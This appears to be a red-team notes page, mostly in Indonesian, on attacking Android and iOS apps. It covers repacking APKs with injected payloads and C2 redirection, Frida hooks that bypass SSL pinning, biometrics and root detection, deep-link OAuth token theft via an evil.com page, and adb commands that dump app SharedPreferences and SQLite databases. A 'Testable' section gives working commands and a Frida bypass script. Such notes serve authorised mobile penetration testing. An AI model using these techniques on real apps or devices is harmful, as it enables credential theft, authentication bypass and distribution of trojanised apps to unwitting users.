---
title: Attack Perspective — Mobile Security (Red Team)
tags:
- attack
- red-team
- mobile
- android
- ios
- root
- frida
- smali
- deep-link
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# Mobile Security — Perspektif Penyerang

> Mobile = bypass 2FA, exfil data pribadi, compromise corporate BYOD. Red team: APK RE (smali patch), Frida hook, deep link abuse, SSL pinning bypass, rooted device exploit.

## 1. Attack Surface Mobile

| Komponen | Vektor | MITRE ID | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|----------|---------------|---------|----------------|
| **APK** | Decompile → smali patch → repack → sign | T1055 | apktool, jadx, apksigner | Repacked = valid signature (attacker key) | Play Integrity = partial |
| **Frida Hook** | Hook function → bypass auth, intercept data | T1055 | Frida, objection | In-memory = no disk artifact | Frida detect = partial (root check) |
| **Deep Link** | Malicious URL → trigger app activity → data exfil | T1190 | adb, intent fuzz, deeplink audit | Deep link = legit URL | Deep link audit = rare |
| **SSL Pinning** | Pinning bypass → MITM app traffic | T1557 | objection, Frida SSL unpin | In-memory hook → no cert install | MITM detect = rare (app-side) |
| **Root** | Root device → access app data, bypass sandbox | T1068 | Magisk, Frida server | Root = legit (user device) | Root detect = partial (SafetyNet) |
| **Backup** | adb backup → app data → credential | T1552 | adb backup, abe extract | Backup = legit operation | Backup audit = rare |
| **SharedPrefs/DB** | SQLite DB → credential/secret | T1552 | adb shell, sqlite3 | DB = app data → legit access | Local DB audit = rare |
| **OAuth Flow** | Token theft via deep link redirect | T1557 | Custom redirect URI abuse | Redirect = legit flow | OAuth audit = rare |

## 2. APK Patch Chain (Repack)

```
Prereq: APK target (official or sideload)
    ↓
Decompile:
  ├── apktool d target.apk → smali + resources
  ├── jadx → Java source (readable)
  └→ Identifikasi: auth check, license check, API endpoint, secret
    ↓
Patch (smali):
  ├── Bypass auth: nop out check → force true
  ├── Modify API endpoint → redirect C2
  ├── Inject logging → exfil data
  └── Disable root/emulator detect → bypass anti-analysis
    ↓
Rebuild:
  ├── apktool b → new APK
  ├── Sign: apksigner sign --ks attacker.keystore
  └→ zipalign → install
    ↓
Delivery: Sideload / phishing / compromised app store
    ↓
Result: Modified app → bypass auth → data access → C2
```

## 3. Frida Attack Chain

```
Recon: Target app (rooted device or emulator)
    ↓
Frida Server: Push frida-server → run as root
    ↓
Hook:
  ├── objection → automated: SSL unpin, root detect bypass, class enum
  ├── Frida script: hook auth function → return true
  ├── Intercept API response → modify data
  └── Dump keystore / SharedPreferences / SQLite
    ↓
Bypass:
  ├── SSL pinning: objection android sslpinning disable
  ├── Root detect: hook RootBeer / SafetyNet → return false
  ├── Biometric: hook BiometricPrompt → onAuthenticationSucceeded
  └── Emulator detect: hook Build.FINGERPRINT → real device
    ↓
Impact: Full app data access → credential → API → backend
```

## 4. Deep Link Abuse

```
Enum: aapt dump xmltree → AndroidManifest → intent-filter
  ├── scheme://host/path → deep link
  ├── App Links (verified) vs Intent (unverified)
  └→ Find: login callback, token exchange, file open
    ↓
Exploit:
  ├── Malicious URL: scheme://host/login?token=attacker
  ├── Token theft: redirect URI → attacker domain
  ├── Arbitrary file open: file:// → exfil
  └→ Activity launch: launch internal activity → bypass auth
    ↓
Delivery: SMS phishing / in-app link / QR code
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **apktool** | APK decompile/rebuild (smali) |
| **jadx** | APK → Java source |
| **apksigner** | Sign repacked APK |
| **Frida** | Dynamic instrumentation (hook, bypass) |
| **objection** | Automated Frida (SSL unpin, root bypass) |
| **adb** | Device access, backup, shell |
| **Burp Suite** | Mobile traffic intercept (with pinning bypass) |

## 6. Referensi
- Frida — https://frida.re/
- Objection — https://github.com/sensepost/objection
- apktool — https://ibotpeaches.github.io/Apktool/
- OWASP MASVS — https://mas.owasp.org/
- Mobile Security Framework (MobSF) — https://github.com/MobSF/Mobile-Security-Framework-MobSF

## Konkret — Android Exploit Payload (Testable)

### APK Decompile + Inject

```bash
# 1. Decompile APK
apktool d target.apk -o target_src
# 2. Edit smali (injeksi payload)
# Misal: SplashActivity.smali → tambah Runtime.exec()
# 3. Recompile
apktool b target_src -o target_mod.apk
# 4. Sign (build-tools)
apksigner sign --ks debug.keystore --ks-key-alias androiddebugkey target_mod.apk
# Atau zipalign + jarsign (API <24)
zipalign -v 4 target_mod.apk target_aligned.apk
```

### Frida Hooking (Runtime Instrumentation)

```bash
# 1. Frida server di device (root)
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# 2. Hook SSL pinning (bypass cert check)
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# 3. Hook encryption (dump key/iv sebelum enkripsi)
frida -U -f com.target.app -l dump_crypto.js

# bypass script:
Java.perform(function() {
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(a, b, c) {
        console.log("[*] SSL pinning bypassed");
        this.init(a, [Java.use('javax.net.ssl.X509TrustManager').$new()], c);
    };
});
```

### Deep Link Hijacking

```xml
<!-- AndroidManifest.xml: target app register deep link -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="myapp" android:host="callback" />
</intent-filter>

<!-- Attacker: bikin HTML page di evil.com -->
<a href="myapp://callback?token=STOLEN_TOKEN">Click</a>
<!-- Victim klik → target app terima token attacker → OAuth token theft -->
```

### Root Detection Bypass (Smali)

```smali
# target_src/smali/com/target/RootCheck.smali
# Method: isDeviceRooted() → return false
.method public static isDeviceRooted()Z
    .locals 1
    const/4 v0, 0x0    # return false (bypass)
    return v0
.end method
```

### ADB Exploit Commands

```bash
# Install APK tanpa konfirmasi ( jika ADB debug enabled )
adb install -r payload.apk

# Akses shell (root jika device rooted / debug build)
adb shell
# Access app private data
adb shell run-as com.target.app
# Dump SharedPreferences
cat /data/data/com.target.app/shared_prefs/*.xml
# Dump SQLite database
cat /data/data/com.target.app/databases/*.db > /sdcard/dump.db
```

### Test Checklist Mobile

1. APK decompile → cek exported activities, deep links
2. Frida → hook SSL pinning, crypto, bypass root detection
3. ADB → dump shared_prefs, databases
4. Intent spoofing → kirim intent ke hidden activities
5. WebView → cek JavaScript enabled, addJavascriptInterface
6. Certificate pinning → bypass via Frida/objection
---

audited
---
